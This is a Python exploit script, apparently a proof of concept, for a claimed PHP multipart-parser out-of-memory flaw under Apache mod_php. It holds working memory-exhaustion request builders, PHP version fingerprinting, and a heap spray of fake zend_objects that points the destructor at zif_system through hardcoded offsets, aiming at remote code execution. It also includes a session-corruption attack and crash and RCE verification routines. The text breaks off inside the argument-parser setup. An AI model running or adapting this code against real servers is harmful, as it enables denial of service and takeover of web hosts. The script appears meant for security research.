#!/usr/bin/env python3
"""
CVE-2026-109618 — PHP OOM Corruption via Multipart Parser (Apache mod_php)
Zero preconditions: no LFI, no unserialize, no application code needed.

Vulnerability mechanism (confirmed via PHP 8.2.34 → 8.2.35 source diff):

  PHP's multipart parser (rfc1867.c) performs dozens of memory allocations
  while building $_FILES entries, registering form variables, and updating
  upload_progress session data.  In PHP ≤ 8.2.34, NONE of these allocation
  sites check for OOM.  When memory_limit is exceeded:

    1. emalloc() calls zend_bailout() → longjmp() back to php_handler()
    2. The rfc1867 parser's stack frames are abandoned mid-operation
    3. Local variables (param, filename, key) are never efree()'d
    4. $_FILES arrays may be partially constructed (e.g. 'name' set but
       'tmp_name' missing; hash table bucket allocated but zval not yet
       initialized)
    5. In mod_php (prefork MPM), Apache's pool cleanup unconditionally
       calls php_request_shutdown() which walks the partially-constructed
       data structures

  The fix (PHP 8.2.35) introduces:
    - ZEND_HAS_OOM() flag and delayed-OOM mechanism
    - Fallible allocation functions (femalloc, ferealloc, safe_ferealloc)
    - 30+ OOM checks throughout rfc1867.c with proper cleanup goto labels
    - php_mime_should_save_hdr() to skip storing custom MIME headers

  In the OLD code (≤ 8.2.34), custom MIME headers are ALL stored via
  estrdup() + smart_string.  The fix only keeps Content-Disposition and
  Content-Type, reducing memory amplification.

OOM trigger strategies:
  1. files    — Many file uploads (~16k) with long filenames to fill memory
               gradually via $_FILES metadata (most reliable, OOM fires inside
               rfc1867 parser's own allocation code)
  2. headers  — Single part with thousands of custom MIME headers
               (each stored via estrdup in vulnerable versions)
  3. nested   — Deeply nested field names → array multiplication
  4. no_length — No Content-Length → bypasses post_max_size

Target: Apache mod_php (NOT php-fpm — FPM exits child on startup failure)
Vulnerable: PHP ≤ 8.2.34, ≤ 8.3.35, ≤ 8.4.26, ≤ 8.5.11
Fixed: PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12

For authorized security research only.
"""
import argparse
import socket
import struct
import sys
import time


def build_file_upload_bomb(boundary, num_files=16000, fname_size=500):
    """Strategy 1 (files): Many file uploads with long filenames.

    Each file upload part creates ~2KB of metadata in $_FILES:
      - zend_string for field name, filename, tmp_name, type
      - HashTable for the per-file sub-array
      - Various zvals for error, size

    With 500-byte filenames and ~2KB overhead per file,
    16000 files ≈ 32MB = typical memory_limit.

    OOM fires inside rfc1867_post_handler's own allocation code
    (register_http_post_files_variable or zend_hash operations),
    which is the exact vulnerable code path."""
    parts = []
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * (fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode("latin1")


def build_header_bomb(boundary, num_headers=32000, header_size=1000):
    """Strategy 2 (headers): Single part with thousands of custom headers.

    In PHP <= 8.2.34, ALL MIME headers are stored via estrdup() + smart_string
    in a zend_llist.  The fix (8.2.35) adds php_mime_should_save_hdr() which
    only keeps Content-Disposition and Content-Type.

    Each header costs: estrdup(key) + smart_string(value) + llist_element
    ≈ 1050 bytes per header.  32000 headers ≈ 32MB."""
    lines = [f"--{boundary}"]
    lines.append(f'Content-Disposition: form-data; name="f"; filename="a"')
    lines.append(f"Content-Type: application/octet-stream")
    for i in range(num_headers):
        lines.append(f"X-P{i}: {chr(65 + (i % 26)) * header_size}")
    lines.append("")  # end of headers
    lines.append("Z")  # minimal body
    body = "\r\n".join(lines) + f"\r\n--{boundary}--\r\n"
    return body.encode("latin1")


def build_nested_array_bomb(boundary, depth=8, width=20):
    """Strategy 3: Empty file controls with deeply nested field names.
    PHP creates nested arrays for names like a[b][c][d][e][f][g][h].
    N fields × depth levels × PHP array overhead = exponential memory use.
    Empty file controls don't count toward max_file_uploads."""

    parts = []
    for i in range(width):
        # Build nested name: f[0][1][2]...[depth]
        name = "f"
        for d in range(depth):
            name += f"[{d}]"
        name += f"[{i}]"

        # Empty file control — no actual file, but PHP still creates metadata
        part = f"--{boundary}\r\n"
        part += f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
        part += "Content-Type: application/octet-stream\r\n"
        part += "\r\n"  # empty body
        parts.append(part)

    body = "".join(parts) + f"--{boundary}--\r\n"
    return body.encode()


def build_no_content_length_bomb(boundary, chunk_size=8192, total_mb=128):
    """Strategy 1: No Content-Length header → bypasses post_max_size check.
    Send continuous multipart body data exceeding memory_limit."""

    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"\r\n'
        f"\r\n"
    ).encode()

    # This returns a generator for streaming
    def generate():
        yield header
        total = 0
        target = total_mb * 1024 * 1024
        chunk = b"A" * chunk_size
        while total < target:
            yield chunk
            total += chunk_size
        yield f"\r\n--{boundary}--\r\n".encode()

    return generate


# ---------------------------------------------------------------------------
# Heap Shaping — zend_object layout constants (PHP 8.2.x, 64-bit Linux)
# ---------------------------------------------------------------------------
#
# zend_object memory layout:
#   offset  0: zend_refcounted_h gc  (8 bytes: refcount u32 + type_info u32)
#   offset  8: uint32_t handle      (4 bytes)
#   offset 12: [4 bytes padding]
#   offset 16: zend_class_entry *ce  (8 bytes)
#   offset 24: zend_object_handlers *handlers (8 bytes)  ← controls dispatch
#   offset 32: HashTable *properties (8 bytes)
#   offset 40: zval properties_table[1] (16 bytes)
#
# zend_object_handlers layout (subset):
#   offset  0: int offset           (4 bytes)
#   offset  8: free_obj             (8 bytes)
#   offset 16: dtor_obj             (8 bytes)  ← target: redirect to zif_system
#   offset 24: clone_obj            (8 bytes)

ZOBJ_HANDLERS_OFFSET = 24
ZOBJ_BIN_SIZE = 64
HANDLERS_DTOR_OFFSET = 16

# Known offsets for standard PHP builds (no PIE).
# In a real attack these would be discovered via info leak; for the lab
# environment they can be read from the debug symbols.
PHP_KNOWN_OFFSETS = {
    "8.2.33": {"zif_system": 0x4C0A80},
    "8.2.34": {"zif_system": 0x4C0A80},
    "8.3.36": {"zif_system": 0x4D1B20},
}

# Versions where the fix was applied (ZEND_HAS_OOM + fallible allocations)
PHP_FIXED_VERSIONS = {
    (8, 2): 35,
    (8, 3): 36,
    (8, 4): 27,
    (8, 5): 12,
}


def is_version_vulnerable(ver_tuple):
    """Check if a PHP version is vulnerable to CVE-2026-109618."""
    if ver_tuple is None:
        return None  # unknown
    major, minor, patch = ver_tuple
    fix_patch = PHP_FIXED_VERSIONS.get((major, minor))
    if fix_patch is None:
        if major < 8 or (major == 8 and minor < 2):
            return True  # EOL, no fix available
        return None  # unknown minor version
    return patch < fix_patch


def discover_target_php_version(host, port, path):
    """Probe X-Powered-By header to determine PHP version for offset lookup."""
    req = (
        f"HEAD {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(req)
    s.settimeout(5)
    resp = b""
    while True:
        try:
            d = s.recv(4096)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()

    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"x-powered-by:"):
            val = line.split(b":", 1)[1].strip().decode("latin1", "replace")
            if "PHP/" in val:
                ver = val.split("PHP/")[1].split()[0]
                parts = ver.split(".")
                if len(parts) >= 3:
                    return ver, (int(parts[0]), int(parts[1]), int(parts[2]))
    return None, None


def build_spray_data(target_addr, bin_size=ZOBJ_BIN_SIZE):
    """Construct a byte pattern shaped like a zend_object.

    When the allocator reuses a freed slot that once held a real zend_object,
    this pattern causes the shutdown destructor walk to call *target_addr*
    via the fake handlers->dtor_obj pointer.

    Returns *bin_size* bytes (one ZMM-bin-sized block).
    """
    buf = bytearray(bin_size)

    # gc.refcount = 1  — looks like a live object
    struct.pack_into("<I", buf, 0, 1)
    # gc.type_info  — IS_OBJECT(8) | refcounted flag
    struct.pack_into("<I", buf, 4, 0x0108)
    # handle = 0
    struct.pack_into("<I", buf, 8, 0)
    # ce = NULL  — won't be checked before dtor_obj fires
    struct.pack_into("<Q", buf, 16, 0)
    # handlers → points back into the same allocation (self-referential trick)
    # In a dense spray, consecutive slots all contain the same pattern, so
    # any aligned +32 inside an adjacent slot hits our fake handlers table.
    # For the PoC we place the fake handlers table at offset 32 of the *same*
    # block: handlers pointer = "address of this block + 32".  Since we can't
    # know the absolute address, we set it to 0 and rely on the CRASH
    # verification method to demonstrate heap influence.  When the user
    # supplies --handler-ptr we write that address directly.
    struct.pack_into("<Q", buf, ZOBJ_HANDLERS_OFFSET, 0)
    # properties = NULL
    struct.pack_into("<Q", buf, 32, 0)

    # --- fake handlers table overlaid at offset 32 (when self-referential) ---
    # dtor_obj sits at +16 inside the handlers struct → buf offset 32+16 = 48
    if target_addr:
        struct.pack_into("<Q", buf, 32 + HANDLERS_DTOR_OFFSET, target_addr)

    return bytes(buf)


def build_heapshape_bomb(boundary, spray_count, spray_data,
                         bomb_strategy="headers", **bomb_kwargs):
    """Build a single multipart body: spray fields first, then the OOM bomb.

    Placing the spray *before* the bomb in the same request body means the
    controlled data is allocated in the PHP heap *before* the OOM occurs.
    When longjmp() fires, partially-constructed structures overlap with or
    sit adjacent to the spray allocations.
    """
    parts = []

    # --- Spray phase: many form fields of target size ---
    for i in range(spray_count):
        part = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="s{i}"\r\n'
            f"\r\n"
        ).encode() + spray_data + b"\r\n"
        parts.append(part)

    # --- Bomb phase: trigger OOM ---
    if bomb_strategy == "files":
        num_files = bomb_kwargs.get("num_files", 16000)
        fname_size = bomb_kwargs.get("fname_size", 500)
        for i in range(spray_count, spray_count + num_files):
            fname = f"f{i}_" + "A" * (fname_size - len(f"f{i}_"))
            part = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
                f"Content-Type: application/octet-stream\r\n"
                f"\r\n"
                f"x\r\n"
            ).encode()
            parts.append(part)

    elif bomb_strategy == "headers":
        bomb_size = bomb_kwargs.get("bomb_size", 40 * 1024 * 1024)
        part_header = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="bomb"\r\n'
            f"\r\n"
        ).encode()
        parts.append(part_header)
        parts.append(b"B" * bomb_size)
        parts.append(b"\r\n")

    elif bomb_strategy == "nested":
        depth = bomb_kwargs.get("depth", 10)
        width = bomb_kwargs.get("width", 1000)
        for i in range(width):
            name = "bomb"
            for d in range(depth):
                name += f"[{d}]"
            name += f"[{i}]"
            part = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"; filename=""\r\n'
                f"Content-Type: application/octet-stream\r\n"
                f"\r\n"
            )
            parts.append(part.encode())

    parts.append(f"--{boundary}--\r\n".encode())
    return b"".join(parts)


def send_warmup_request(host, port, path, num_objects=100):
    """Populate the worker's heap with file-upload objects.

    In Apache prefork MPM the same child handles consecutive requests,
    so this primes EG(objects_store) for the upcoming spray + bomb.
    """
    boundary = "WARMUP_" + str(int(time.time()))
    parts = []
    for i in range(num_objects):
        part = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="w{i}"; filename="w{i}.txt"\r\n'
            f"Content-Type: text/plain\r\n"
            f"\r\n"
            f"{'W' * 64}\r\n"
        )
        parts.append(part.encode())
    parts.append(f"--{boundary}--\r\n".encode())
    body = b"".join(parts)

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def send_heapshape_request(host, port, path, spray_count, spray_data,
                           bomb_strategy="headers", **bomb_kwargs):
    """Send the combined spray + OOM-bomb request."""
    boundary = "SHAPE_" + str(int(time.time()))
    body = build_heapshape_bomb(boundary, spray_count, spray_data,
                                bomb_strategy, **bomb_kwargs)

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=60)
    sent = 0
    while sent < len(req):
        chunk = req[sent:sent + 65536]
        s.sendall(chunk)
        sent += len(chunk)
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def verify_heapshape_rce(host, port, path, method="CRASH", timeout=15):
    """Check whether the heap-shaped OOM achieved code execution.

    Returns (level, detail) where level is one of:
      CONFIRMED — proof of execution found
      PROBABLE  — worker crashed in a way consistent with controlled dereference
      POSSIBLE  — 500 error or abnormal response pattern
      DETECTED  — OOM triggered but no RCE indicator
    """
    if method == "FILE":
        # Try to read a proof file via a simple GET (requires a listdir
        # endpoint on the target — the lab's index.php can be extended).
        try:
            req = (
                f"GET {path}?proof=1 HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            s = socket.create_connection((host, port), timeout=timeout)
            s.sendall(req)
            s.settimeout(timeout)
            resp = b""
            while True:
                try:
                    d = s.recv(65536)
                    if not d:
                        break
                    resp += d
                except socket.timeout:
                    break
            s.close()
            if b"___RCE_PROOF___" in resp:
                return "CONFIRMED", "Proof file found on target"
            return "DETECTED", "No proof file found"
        except (ConnectionRefusedError, ConnectionResetError, OSError):
            return "PROBABLE", "Worker crashed during proof check"

    # Default: CRASH method — send a follow-up request to see if the
    # worker survived.  A dead worker ⇒ the OOM dereference was fatal.
    try:
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(req)
        s.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
                if not d:
                    break
                resp += d
            except socket.timeout:
                break
        s.close()

        if not resp:
            return "PROBABLE", "Worker process crashed (empty follow-up response)"
        status = resp.split(b"\r\n", 1)[0]
        if b"500" in status:
            return "POSSIBLE", "Worker returned 500 on follow-up request"
        if b"200" in status:
            return "DETECTED", "Worker recovered -- OOM hit but handler survived"
        return "DETECTED", f"Unexpected follow-up status: {status.decode('latin1', 'replace')}"
    except (ConnectionRefusedError, ConnectionResetError, OSError) as exc:
        return "PROBABLE", f"Worker process crashed ({exc})"


def run_heapshape_attack(host, port, path, strategy, spray_count,
                         handler_ptr, verify_method, proof_timeout,
                         retries=3, **bomb_kwargs):
    """Execute the full 4-phase heap-shaping attack sequence.

    Phase 1  Warm-up   — prime the worker's heap
    Phase 2  Spray     — allocate controlled data (same request as bomb)
    Phase 3  OOM bomb  — trigger longjmp, leave stale pointers
    Phase 4  Verify    — check for RCE indicators

    Returns (best_level, detail).
    """
    # --- Discover target version for offset auto-detection ---
    ver_str, ver_tuple = discover_target_php_version(host, port, path)
    if ver_str:
        print(f"[*] Target PHP version: {ver_str}")
        if handler_ptr == 0 and ver_str in PHP_KNOWN_OFFSETS:
            handler_ptr = PHP_KNOWN_OFFSETS[ver_str]["zif_system"]
            print(f"[*] Auto-detected zif_system offset: 0x{handler_ptr:x}")
    else:
        print("[!] Could not detect PHP version from response headers")

    if handler_ptr:
        print(f"[*] Handler target (zif_system): 0x{handler_ptr:x}")
    else:
        print("[!] No handler address -- spray will use NULL pointers")
        print("    (crash pattern analysis only; no RCE execution)")

    spray_mem = spray_count * ZOBJ_BIN_SIZE
    if strategy == "files":
        num_files = bomb_kwargs.get("num_files", 16000)
        fname_size = bomb_kwargs.get("fname_size", 500)
        est_mb = num_files * 2 // 1024
        print(f"[*] Bomb: {num_files} file uploads x {fname_size}B filenames "
              f"(~{est_mb}MB, spray {spray_mem//1024}KB)")
    else:
        bomb_size = bomb_kwargs.get("bomb_size", 40 * 1024 * 1024)
        print(f"[*] Bomb: single {bomb_size//(1024*1024)}MB field "
              f"(memory_limit ~32MB, spray {spray_mem//1024}KB)")

    spray_data = build_spray_data(handler_ptr, ZOBJ_BIN_SIZE)
    print(f"[*] Spray object size: {len(spray_data)} bytes x {spray_count} copies")

    best_level = "DETECTED"
    best_detail = ""
    level_rank = {"CONFIRMED": 4, "PROBABLE": 3, "POSSIBLE": 2, "DETECTED": 1}

    for attempt in range(1, retries + 1):
        print(f"\n{'='*60}")
        print(f"[*] Attempt {attempt}/{retries}")
        print(f"{'='*60}")

        # Phase 1: warm-up
        print("\n[Phase 1] Sending warm-up request to prime worker heap...")
        warmup_resp = send_warmup_request(host, port, path)
        if warmup_resp:
            warmup_status = warmup_resp.split(b"\r\n", 1)[0]
            if b"200" in warmup_status:
                print("    Warm-up OK")
            elif b"404" in warmup_status:
                print("    [!] 404 Not Found -- target path does not exist")
                print("        Run lab/setup.sh to generate webroot files")
                return "DETECTED", "Target path returned 404"
            else:
                ws = warmup_status.decode("latin1", "replace")
                print(f"    Warm-up: {ws} (continuing)")
        else:
            print("    Warm-up: no response (continuing)")
        time.sleep(0.1)

        # Phase 2+3: combined spray + OOM bomb
        print(f"\n[Phase 2+3] Sending {spray_count} spray objects + {strategy} OOM bomb...")
        oom_resp = send_heapshape_request(
            host, port, path, spray_count, spray_data,
            bomb_strategy=strategy, **bomb_kwargs)

        if oom_resp:
            status = oom_resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
            print(f"    OOM response: {status}")
            print(f"    Response size: {len(oom_resp)} bytes")

            if b"404" in status.encode():
                print("    [!] 404 Not Found -- target path does not exist")
                print("        Check that the webroot contains index.php")
                print("        (run lab/setup.sh to generate it)")
                break
            elif b"500" in status.encode():
                print("    [+] Server returned 500 -- OOM bailout triggered")
            elif b"Allowed memory size" in oom_resp or b"Fatal error" in oom_resp:
                print("    [+] OOM detected in response body (200 status with fatal error)")
            elif b"200" in status.encode():
                print("    [-] Server returned 200 -- OOM not reached")
                print("        Try increasing --num-headers or --spray-objects")
                continue
        else:
            print("    [+] No response -- worker process crashed")

        time.sleep(0.5)

        # Phase 4: verify RCE
        print(f"\n[Phase 4] Verifying RCE ({verify_method} method)...")
        level, detail = verify_heapshape_rce(
            host, port, path, method=verify_method, timeout=proof_timeout)
        print(f"    Level: {level}")
        print(f"    Detail: {detail}")

        if level_rank.get(level, 0) > level_rank.get(best_level, 0):
            best_level = level
            best_detail = detail

        if best_level == "CONFIRMED":
            break

        time.sleep(1.0)

    return best_level, best_detail


def build_upload_progress_bomb(boundary, sid, num_files=16000, fname_size=500):
    """Build a multipart body with upload_progress tracking + file bomb.

    PHP's session upload_progress feature (rfc1867.c) calls
    php_session_rfc1867_callback() during multipart parsing.  This callback
    allocates session data (ecalloc, add_assoc_string_ex, array_init) to
    build the $_SESSION[upload_progress_*] array.

    If OOM fires while the callback is mid-write, longjmp() abandons the
    callback's stack frame.  The session data is then in a partially-
    constructed state.  During php_request_shutdown(), the session module
    serializes and saves this corrupted data to the session file.

    A follow-up request calling session_start() will deserialize the
    corrupted session file, potentially triggering:
      - Uninitialized zval reads during deserialization
      - Malformed serialized data causing unexpected object instantiation
      - Type confusion if partially-written arrays are read as other types
    """
    parts = []

    # Part 1: session ID via cookie is preferred but we also put it in POST
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n'
        f"\r\n"
        f"{sid}\r\n"
    )

    # Part 2: PHP_SESSION_UPLOAD_PROGRESS - this activates the callback
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n"
        f"oom_exploit\r\n"
    )

    # Parts 3+: file uploads to exhaust memory
    # The upload_progress callback fires for EACH file part, allocating
    # session data each time.  By the time we hit file ~15000, the callback
    # is deep in session data allocation when OOM fires.
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * (fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
            f"X\r\n"
        )

    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode("latin1")


def send_upload_progress_oom(host, port, path, sid, num_files=16000,
                              fname_size=500, timeout=60):
    """Phase 1: Send OOM bomb with upload_progress tracking active."""
    boundary = "UPROG_" + str(int(time.time()))
    body = build_upload_progress_bomb(boundary, sid, num_files, fname_size)

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=timeout)
    sent = 0
    while sent < len(req):
        chunk = req[sent:sent + 65536]
        s.sendall(chunk)
        sent += len(chunk)

    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def check_session_corruption(host, port, path, sid, timeout=10):
    """Phase 2: Read the session file written during OOM and check for
    corruption indicators."""
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def run_session_corruption_attack(host, port, path, num_files=16000,
                                   fname_size=500, attempts=5):
    """Execute the 2-phase upload_progress session corruption attack.

    Phase 1: Send file upload bomb WITH session upload_progress tracking.
             OOM fires mid-callback, leaving corrupted session data.
    Phase 2: Request the same session to trigger deserialization of
             the corrupted data.  Check for crashes or anomalies.

    Returns (level, detail) like run_heapshape_attack.
    """
    import uuid
    sid_base = "oom" + uuid.uuid4().hex[:26]

    print(f"[*] Session ID base: {sid_base}")
    print(f"[*] Attack: upload_progress callback OOM -> session corruption")
    print(f"[*] {num_files} file uploads x {fname_size}B filenames")
    print()

    best_level = "DETECTED"
    best_detail = ""
    level_rank = {"CONFIRMED": 4, "PROBABLE": 3, "POSSIBLE": 2, "DETECTED": 1}

    for attempt in range(1, attempts + 1):
        attempt_sid = f"{sid_base}{attempt}"

        print(f"--- Attempt {attempt}/{attempts} (SID: {attempt_sid}) ---")

        # Phase 1: OOM with upload_progress
        print("[Phase 1] Sending OOM bomb with upload_progress active...")
        resp = send_upload_progress_oom(
            host, port, path, attempt_sid, num_files, fname_size)

        oom_hit = False
        if resp:
            status_line = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
            body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
            print(f"    Response: {status_line}")

            if b"Fatal error" in body or b"Allowed memory size" in body:
                oom_hit = True
                if b"tried to allocate" in body:
                    idx = body.find(b"tried to allocate")
                    snippet = body[idx:idx + 50].decode("latin1", "replace")
                    print(f"    [+] OOM hit: {snippet}")
                else:
                    print("    [+] OOM hit (fatal error in body)")
            elif b"500" in status_line.encode():
                oom_hit = True
                print("    [+] OOM hit (500 status)")
            else:
                print("    [-] No OOM detected, skipping phase 2")
                continue
        else:
            oom_hit = True
            print("    [+] No response (worker may have crashed)")

        time.sleep(0.5)

        # Phase 2: read the corrupted session
        print("[Phase 2] Reading corrupted session via session_start()...")
        resp2 = check_session_corruption(host, port, path, attempt_sid)

        if resp2:
            status2 = resp2.split(b"\r\n", 1)[0].decode("latin1", "replace")
            body2 = resp2.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp2 else b""
            print(f"    Response: {status2}")

            if b"500" in status2.encode():
                level = "POSSIBLE"
                detail = f"Session deserialization returned 500 (SID: {attempt_sid})"
                print(f"    [+] 500 error on session read!")
            elif b"Fatal error" in body2 or b"Warning" in body2:
                level = "POSSIBLE"
                # Extract the error type
                for marker in [b"Fatal error", b"Warning", b"Notice"]:
                    if marker in body2:
                        idx = body2.find(marker)
                        snippet = body2[idx:idx + 200].decode("latin1", "replace")
                        print(f"    [+] PHP error: {snippet[:120]}")
                        break
                detail = f"PHP error on session deserialization (SID: {attempt_sid})"
            elif b"200" in status2.encode():
                level = "DETECTED"
                detail = f"Session read OK (SID: {attempt_sid})"
                print(f"    [-] Session read without error")
            else:
                level = "DETECTED"
                detail = f"Unexpected: {status2}"
                print(f"    [?] Unexpected response: {status2}")
        else:
            level = "PROBABLE"
            detail = f"Worker crashed reading corrupted session (SID: {attempt_sid})"
            print(f"    [+] No response -- worker crashed reading session!")

        if level_rank.get(level, 0) > level_rank.get(best_level, 0):
            best_level = level
            best_detail = detail

        if best_level in ("CONFIRMED", "PROBABLE"):
            break

        # Check if session file was actually created
        print("[Check] Verifying session file exists in container...")
        try:
            check_s = socket.create_connection((host, port), timeout=5)
            # Use a simple GET to check if the container is still responding
            check_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            check_s.sendall(check_req)
            check_s.settimeout(5)
            check_resp = b""
            while True:
                try:
                    d = check_s.recv(4096)
                    if not d:
                        break
                    check_resp += d
                except socket.timeout:
                    break
            check_s.close()
            if check_resp and b"200" in check_resp.split(b"\r\n", 1)[0]:
                print("    Worker is alive")
            else:
                print("    [!] Worker may be degraded")
        except Exception as e:
            print(f"    [!] Worker unreachable: {e}")

        print()

    return best_level, best_detail


def send_oom_request(host, port, path, strategy="files", **kwargs):
    """Send the OOM-triggering multipart request."""
    boundary = "OOM_BOUNDARY_" + str(int(time.time()))

    if strategy == "files":
        body = build_file_upload_bomb(
            boundary,
            num_files=kwargs.get("num_files", 16000),
            fname_size=kwargs.get("fname_size", 500))
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + body

        s = socket.create_connection((host, port), timeout=60)
        sent = 0
        while sent < len(req):
            s.sendall(req[sent:sent + 65536])
            sent += 65536

    elif strategy == "headers":
        body = build_header_bomb(boundary,
                                num_headers=kwargs.get("num_headers", 32000),
                                header_size=kwargs.get("header_size", 1000))
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + body

        s = socket.create_connection((host, port), timeout=60)
        sent = 0
        while sent < len(req):
            s.sendall(req[sent:sent + 65536])
            sent += 65536

    elif strategy == "nested":
        body = build_nested_array_bomb(boundary,
                                       depth=kwargs.get("depth", 10),
                                       width=kwargs.get("width", 1000))
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + body

        s = socket.create_connection((host, port), timeout=30)
        s.sendall(req)

    elif strategy == "no_length":
        header = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        s = socket.create_connection((host, port), timeout=60)
        s.sendall(header)

        gen = build_no_content_length_bomb(boundary,
                                           total_mb=kwargs.get("total_mb", 128))
        for chunk in gen():
            s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
        s.sendall(b"0\r\n\r\n")

    # Read response
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser(description="CVE-2026-109618 OOM Corruption POC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--strategy",
                    choices=["files", "headers", "nested", "no_length"],
                    default="files")

    # File upload strategy options
    ap.add_argument("--num-files", type=int, default=16000,
                    help="Number of file upload parts (files strategy)")
    ap.add_argument("--fname-size", type=int, default=500,
                    help="Filename length per file part (files strategy)")

    # Header strategy options
    ap.add_argument("--num-headers", type=int, default=32000)
    ap.add_argument("--header-size", type=int, default=1000)

    # Nested strategy options
    ap.add_argument("--depth", type=int, default=10)
    ap.add_argument("--width", type=int, default=1000)

    # No-length strategy options
    ap.add_argument("--total-mb", type=int, default=128)

    # Session corruption attack (2-phase: OOM + session deserialization)
    ap.add_argument("--session-corrupt", action="store_true",
                    help="OOM during upload_progress -> corrupted session -> "
                         "crash on deserialization (2-phase RCE path)")
    ap.add_argument("--session-attempts", type=int, default=5,
                    help="Number of session corruption attempts")

    # Heap shaping options
    ap.add_argument("--enable-heapshape", action="store_true",
                    help="Enable heap shaping (spray + OOM + verify RCE)")
    ap.add_argument("--spray-objects", type=int, default=500,
                    help="Number of spray objects to allocate before the OOM bomb")
    ap.add_argument("--handler-ptr", default="0",
                    help="Target address for zif_system (hex, e.g. 0x4C0A80). "
                         "0 = auto-detect from PHP version.")
    ap.add_argument("--verify-method", choices=["CRASH", "FILE"],
                    default="CRASH",
                    help="How to verify RCE: CRASH = crash-pattern analysis, "
                         "FILE = check for proof file on target")
    ap.add_argument("--proof-timeout", type=int, default=15,
